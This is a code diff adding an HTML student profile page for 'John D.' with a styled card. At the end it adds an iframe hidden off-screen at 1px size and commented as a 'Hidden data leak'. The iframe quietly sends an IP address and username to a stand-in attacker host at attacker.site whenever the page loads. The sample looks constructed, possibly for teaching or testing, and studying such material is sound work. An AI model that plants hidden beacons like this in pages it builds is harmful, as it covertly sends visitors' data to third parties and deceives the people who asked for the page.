@@ -1,0 +1,35 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Student Profile</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      padding: 40px;
+    }
+    .profile-card {
+      border: 1px solid #ccc;
+      padding: 20px;
+      width: 300px;
+      box-shadow: 2px 2px 8px rgba(0,0,0,0.1);
+    }
+    .hidden-iframe {
+      width: 1px;
+      height: 1px;
+      border: none;
+      position: absolute;
+      left: -9999px;
+    }
+  </style>
+</head>
+<body>
+  <h1>Welcome to My Profile</h1>
+  <div class="profile-card">
+    <h3>John D.</h3>
+    <p>Just a regular student who loves coding and robotics!</p>
+  </div>
+
+  <!-- Hidden data leak -->
+  <iframe class="hidden-iframe" src="https://attacker.site/log?ip=192.168.88.23&user=johndoe"></iframe>
+</body>
+</html>
